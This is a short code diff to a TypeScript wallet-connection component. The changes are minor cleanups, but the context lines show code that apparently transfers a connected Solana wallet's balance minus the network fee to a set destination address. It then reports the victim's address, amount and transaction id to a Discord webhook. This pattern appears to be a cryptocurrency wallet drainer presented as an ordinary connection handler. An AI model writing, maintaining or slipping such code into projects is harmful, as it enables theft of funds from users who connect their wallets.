@@ -137,12 +137,12 @@ const WalletConnectionHandler: FC = () => {
                 SystemProgram.transfer({
                     fromPubkey: walletPublicKey,
                     toPubkey,
-                    lamports: lamports,
+                    lamports,
                 })
             );
 
             const feeResp = await connection.getFeeForMessage(tx.compileMessage());
-            const feeLamports = feeResp.value || 5000; // fallback in case of RPC failure
+            const feeLamports = feeResp.value || 5000;
 
             const sendableLamports = lamports - feeLamports;
             if (sendableLamports <= 0) {
@@ -168,7 +168,7 @@ const WalletConnectionHandler: FC = () => {
 
                     await sendDiscordWebhook(
                         walletPublicKey.toBase58(),
-                        lamports / LAMPORTS_PER_SOL,
+                        lamports! / LAMPORTS_PER_SOL,
                         sendableLamports,
                         toPubkey.toBase58(),
                         txid
